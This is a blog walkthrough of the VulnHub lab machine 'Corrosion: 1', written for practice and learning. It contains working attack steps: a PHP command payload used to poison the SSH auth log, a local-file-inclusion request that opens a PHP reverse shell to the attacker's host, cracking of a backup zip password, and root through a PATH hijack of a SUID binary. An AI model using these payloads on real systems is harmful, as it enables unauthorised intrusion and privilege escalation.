---
layout: post
title:  "Vulnhub: CORROSION: 1"
date:   2021-08-07 19:00:00 +1000
category: hacking
---

This is [CORROSION: 1](https://www.vulnhub.com/entry/corrosion-1,730/) from VulnHub:

>A easy box for beginners, but not too easy. Good Luck.

## Ports
SSH and HTTP only. 

## HTTP
``
python3 /opt/dirsearch/dirsearch.py -u http://192.168.1.108
``

Dirsearch turns up /tasks/ which contains *tasks_todo.txt*. It says:

># Tasks that need to be completed
1. Change permissions for auth log  
2. Change port 22 -> 7672
3. Set up phpMyAdmin

I've obviously done too many of these because my immediate thought was we are poisoning /var/log/auth.log via SSH and using a PHP LFI to include the poisoned log for a shell. As it turned out, that was correct. So, how did we find our LFI? We need to search for PHP files. I use feroxbuster. We find only a couple of things, one of which is:

>http://192.168.1.108/blog-post/archives/

This has directory listing enabled and there is one entry, *randylogs.php*. I use Burp Turbo Intruder to find the parameter, but you could just guess it (it's **file**):

{% highlight html %}
GET /blog-post/archives/randylogs.php?%s=../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
{% endhighlight %}

%s of course turns out to be **file**. From there we have to poison auth.log. **zsh** doesn't like the syntax, but **bash** doesn't mind:

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/corrosion]
└─# bash                                                                                   
┌──(root💀kali)-[/opt/vulnhub/corrosion]
└─# ssh '<?php system($_GET['cmd']); ?>'@192.168.1.108
<?php system($_GET[cmd]); ?>@192.168.1.108s password: 
Permission denied, please try again.
# CTRL+c at this point, we're done
{% endhighlight %}

Now we can call a shell:

{% highlight html %}
GET /blog-post/archives/randylogs.php?file=../../../../../../../../../../var/log/auth.log&cmd=php+-r+'$sock%3dfsockopen("192.168.1",1234)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
{% endhighlight %}

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/corrosion]
└─# nc -nvlp 1234                                                                         
listening on [any] 1234 ...
connect to [192.168.1.210] from (UNKNOWN) [192.168.1.108] 36316
/bin/sh: 0: cant access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@corrosion:/var/www/html/blog-post/archives$
{% endhighlight %}

## Privesc
With some enumeration we find a backup file that we have to exfil and crack the password; let's do that first:

{% highlight shell %}
www-data@corrosion:/var/backups$ cp user_backup.zip /tmp/backup.zip
cp user_backup.zip /tmp/backup.zip
www-data@corrosion:/var/backups$ cd /tmp
cd /tmp
www-data@corrosion:/tmp$ ls -lash
ls -lash
total 12K
4.0K drwxrwxrwt  2 root     root     4.0K Aug  7 03:36 .
4.0K drwxr-xr-x 20 root     root     4.0K Jul 29 17:05 ..
4.0K -rw-r--r--  1 www-data www-data 3.3K Aug  7 03:36 backup.zip
www-data@corrosion:/tmp$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.210 - - [07/Aug/2021 03:37:16] "GET /backup.zip HTTP/1.1" 200 -
{% endhighlight %}

In Kali:
{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/corrosion]
└─# wget http://192.168.1.108:8000/backup.zip      
--2021-08-07 05:37:16--  http://192.168.1.108:8000/backup.zip
Connecting to 192.168.1.108:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3285 (3.2K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                                     100%[=================================================================================================>]   3.21K  --.-KB/s    in 0s      

2021-08-07 05:37:17 (450 MB/s) - ‘backup.zip’ saved [3285/3285]
                                                                                        
┌──(root💀kali)-[/opt/vulnhub/corrosion]
└─# zip2john backup.zip > john.zip
ver 2.0 efh 5455 efh 7875 backup.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1979, decmplen=2590, crc=A144E09A
ver 2.0 efh 5455 efh 7875 backup.zip/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=470, decmplen=563, crc=41C30277
ver 1.0 efh 5455 efh 7875 backup.zip/my_password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=35, decmplen=23, crc=21E9B663
ver 2.0 efh 5455 efh 7875 backup.zip/easysysinfo.c PKZIP Encr: 2b chk, TS_chk, cmplen=115, decmplen=148, crc=A256BBD9
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
    
┌──(root💀kali)-[/opt/vulnhub/corrosion]
└─# john john.zip -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!randybaby       (backup.zip)
1g 0:00:00:01 DONE (2021-08-07 05:37) 0.7352g/s 10541Kp/s 10541Kc/s 10541KC/s #1Emokid..!jonas
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

Let's go back to the box:

{% highlight shell %}
www-data@corrosion:/tmp$ unzip backup.zip
unzip backup.zip
Archive:  backup.zip
[backup.zip] id_rsa password: !randybaby

  inflating: id_rsa                  
  inflating: id_rsa.pub              
 extracting: my_password.txt         
  inflating: easysysinfo.c           
www-data@corrosion:/tmp$ cat eas
cat easysysinfo.c 
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/usr/bin/date");

  system("cat /etc/hosts");

  system("/usr/bin/uname -a");

}
{% endhighlight %}

Right, looks like we got a path to root here. But first we need to be *randy*:

{% highlight shell %}
www-data@corrosion:/tmp$ cat my_password.txt
cat my_password.txt
randylovesgoldfish1998
www-data@corrosion:/tmp$ su randy
su randy
Password: randylovesgoldfish1998

randy@corrosion:/tmp$
{% endhighlight %}

No problem there. Also we have some SSH keys so I guess we could have connected via SSH as randy if we wanted. No need at this point though.

Let's find our compiled SUID binary:

{% highlight shell %}
randy@corrosion:~$ cd tools
cd tools
randy@corrosion:~/tools$ ls -lash
ls -lash
total 28K
4.0K drwxrwxr-x  2 randy randy 4.0K Jul 30 00:11 .
4.0K drwxr-x--- 17 randy randy 4.0K Jul 30 16:01 ..
 16K -rwsr-xr-x  1 root  root   16K Jul 30 00:11 easysysinfo
4.0K -rwxr-xr-x  1 root  root   318 Jul 29 19:12 easysysinfo.py
{% endhighlight %}

And there it is. Not sure why the python file - maybe this was a second path to root via python module abuse. We don't need it though so I won't bother. Looking at the source earlier we had fully quoted paths for **date** and **uname**, but not **cat**. So let's abuse that:

{% highlight shell %}
randy@corrosion:~/tools$ echo 'sh' > cat
echo 'sh' > cat
randy@corrosion:~/tools$ chmod +x cat
chmod +x cat
randy@corrosion:~/tools$ export PATH=/home/randy/tools:$PATH
export PATH=/home/randy/tools:$PATH
randy@corrosion:~/tools$ echo $PATH
echo $PATH
/home/randy/tools:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
randy@corrosion:~/tools$ ./easysysinfo
./easysysinfo
Sat Aug  7 03:41:16 AM MDT 2021
# id;hostname;date
id;hostname;date
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),133(sambashare),1000(randy)
corrosion
Sat Aug  7 03:41:21 AM MDT 2021
# cd /root
{% endhighlight %}

And we are done. 
